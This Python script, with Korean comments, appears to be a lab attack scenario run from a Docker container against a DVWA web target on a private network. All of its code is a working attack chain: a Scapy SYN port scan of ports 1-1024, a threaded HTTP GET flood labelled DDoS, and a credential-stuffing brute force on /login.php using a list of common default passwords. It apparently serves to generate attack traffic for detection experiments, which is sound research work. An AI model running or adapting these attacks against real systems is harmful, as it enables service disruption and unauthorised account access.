#!/usr/bin/env python3
"""
attack4.py - 실험용 공격 시나리오 (Docker 컨테이너 내부 실행)

시나리오:
  [1/3] PortScan  : Scapy TCP SYN scan, ports 1-1024
  [2/3] DDoS      : HTTP GET flood, 500 connections (Connection: close)
  [3/3] Brute Force: HTTP POST /login.php credential stuffing

실행:
  docker exec attacker python3 /tmp/attack4.py
"""
import http.client
import threading
import time
import random
import sys

from scapy.all import sendp, Ether, IP, TCP, ARP, srp, conf, get_if_hwaddr, get_if_addr
conf.verb = 0

TARGET_IP   = "172.20.0.10"
TARGET_PORT = 80
IFACE       = "eth0"

src_mac = get_if_hwaddr(IFACE)
src_ip  = get_if_addr(IFACE)
print(f"src: {src_ip} / {src_mac}")

ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=TARGET_IP),
             iface=IFACE, timeout=2, verbose=0)
dst_mac = ans[0][1].hwsrc if ans else "ff:ff:ff:ff:ff:ff"
print(f"dst: {TARGET_IP} / {dst_mac}")

# ── [1/3] PortScan ────────────────────────────────────────────
print("\n[1/3] PortScan: SYN scan ports 1-1024...")
sport = random.randint(2000, 9000)
syn_pkts = [
    Ether(src=src_mac, dst=dst_mac) /
    IP(src=src_ip, dst=TARGET_IP) /
    TCP(sport=sport, dport=p, flags="S")
    for p in range(1, 1025)
]
sendp(syn_pkts, iface=IFACE)
time.sleep(2)
print(f"  {len(syn_pkts)} SYN 패킷 전송 완료")

# ── [2/3] DDoS ────────────────────────────────────────────────
print("\n[2/3] DDoS: HTTP GET flood (500 connections)...")

ddos_ok   = [0]
ddos_fail = [0]
lock = threading.Lock()

def ddos_worker(count):
    for _ in range(count):
        try:
            conn = http.client.HTTPConnection(TARGET_IP, TARGET_PORT, timeout=5)
            conn.request("GET", "/dvwa/images/login_logo.png",
                         headers={"Connection": "close"})
            resp = conn.getresponse()
            resp.read()
            conn.close()
            with lock:
                ddos_ok[0] += 1
        except Exception:
            with lock:
                ddos_fail[0] += 1

THREADS = 50
REQ_PER_THREAD = 10
workers = [threading.Thread(target=ddos_worker, args=(REQ_PER_THREAD,))
           for _ in range(THREADS)]
for w in workers: w.start()
for w in workers: w.join()
print(f"  완료: 성공 {ddos_ok[0]}, 실패 {ddos_fail[0]}")
time.sleep(2)

# ── [3/3] Brute Force ─────────────────────────────────────────
print("\n[3/3] Brute Force: HTTP POST /login.php...")

CREDS = [
    ("admin", "password"), ("admin", "123456"), ("admin", "admin"),
    ("root", "root"), ("root", "password"), ("root", "123456"),
    ("user", "user"), ("user", "password"), ("test", "test"),
    ("admin", "letmein"), ("admin", "qwerty"), ("admin", "abc123"),
    ("guest", "guest"), ("dvwa", "dvwa"), ("admin", "password1"),
    ("root", "toor"), ("admin", "admin123"), ("user", "123456"),
    ("admin", "pass"), ("root", "pass"),
]

brute_ok   = [0]
brute_fail = [0]

def brute_worker(cred_list):
    for user, passwd in cred_list:
        try:
            body = f"username={user}&password={passwd}&Login=Login"
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(body)),
                "Connection": "close",
            }
            conn = http.client.HTTPConnection(TARGET_IP, TARGET_PORT, timeout=5)
            conn.request("POST", "/login.php", body=body, headers=headers)
            resp = conn.getresponse()
            resp.read()
            conn.close()
            with lock:
                brute_ok[0] += 1
        except Exception:
            with lock:
                brute_fail[0] += 1

brute_threads = [threading.Thread(target=brute_worker, args=(CREDS,))
                 for _ in range(5)]
for t in brute_threads: t.start()
for t in brute_threads: t.join()
print(f"  완료: 성공 {brute_ok[0]}, 실패 {brute_fail[0]}")

print("\n[완료] 전체 공격 완료")
